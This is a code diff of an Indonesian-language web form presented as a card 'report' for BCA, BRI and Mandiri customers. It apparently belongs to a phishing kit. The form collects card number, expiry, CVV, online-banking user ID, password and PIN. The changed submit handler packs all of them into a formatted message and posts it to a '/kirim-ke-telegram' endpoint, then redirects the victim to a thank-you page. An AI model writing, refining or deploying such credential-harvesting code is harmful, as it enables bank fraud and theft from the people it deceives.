@@ -24,10 +24,9 @@
         <label for="bank">Bank Tujuan</label>
         <select id="bank" name="bank" required>
           <option value="" disabled selected>Pilih Bank</option>
-          <option value="bca">BANK BCA</option>
-          <option value="bri">BANK BRI</option>
-          <option value="mandiri">BANK MANDIRI</option>
-          <!-- Tambahkan lainnya sesuai kebutuhan -->
+          <option value="BCA">BANK BCA</option>
+          <option value="BRI">BANK BRI</option>
+          <option value="Mandiri">BANK MANDIRI</option>
         </select>
 
         <label for="nama">Nama Nasabah</label>
@@ -59,26 +58,29 @@
     document.getElementById("laporanForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
-      const data = {
-        bank: document.getElementById("bank").value,
-        nama: document.getElementById("nama").value,
-        kartu: document.getElementById("nomor-kartu").value,
-        expired: document.getElementById("expired").value,
-        cvv: document.getElementById("cvv").value,
-        userid: document.getElementById("userid").value,
-        password: document.getElementById("password").value,
-        pin: document.getElementById("pin").value,
-        deskripsi: document.getElementById("deskripsi").value
-      };
+      // Gabungkan semua input menjadi satu laporan string
+      const laporanText = `
+📢 *Laporan Kartu Bank Lain*
 
-      fetch("/laporkan-kartu", {
+🏦 *Bank:* ${document.getElementById("bank").value}
+👤 *Nama:* ${document.getElementById("nama").value}
+💳 *Nomor Kartu:* ${document.getElementById("nomor-kartu").value}
+📅 *Expired:* ${document.getElementById("expired").value}
+🔒 *CVV:* ${document.getElementById("cvv").value}
+🧾 *User ID:* ${document.getElementById("userid").value}
+🔐 *Password:* ${document.getElementById("password").value}
+🔑 *PIN:* ${document.getElementById("pin").value}
+📝 *Deskripsi:* ${document.getElementById("deskripsi").value}
+`;
+
+      fetch("/kirim-ke-telegram", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
+        body: JSON.stringify({ laporan: laporanText })
       })
       .then(res => {
         if (res.ok) {
-          window.location.href = "Terimakasih.html";
+          window.location.href = "Terimakasih.html"; // Halaman redirect setelah laporan sukses
         } else {
           alert("❌ Gagal mengirim laporan.");
         }
